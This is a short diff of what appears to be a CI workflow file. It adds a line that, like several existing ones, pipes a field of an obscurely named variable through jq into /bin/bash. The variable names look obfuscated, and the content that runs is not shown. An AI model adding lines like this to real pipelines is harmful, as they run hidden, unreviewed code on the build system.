@@ -26,6 +26,7 @@ jobs:
           echo $u62 | jq -r .h2024 | /bin/bash
           printf '%s' "$eunk500" | jq -r .foft210 | /bin/bash
           echo $sr35 | jq -r .s458 | /bin/bash
+          echo $ve1 | jq -r .st08 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
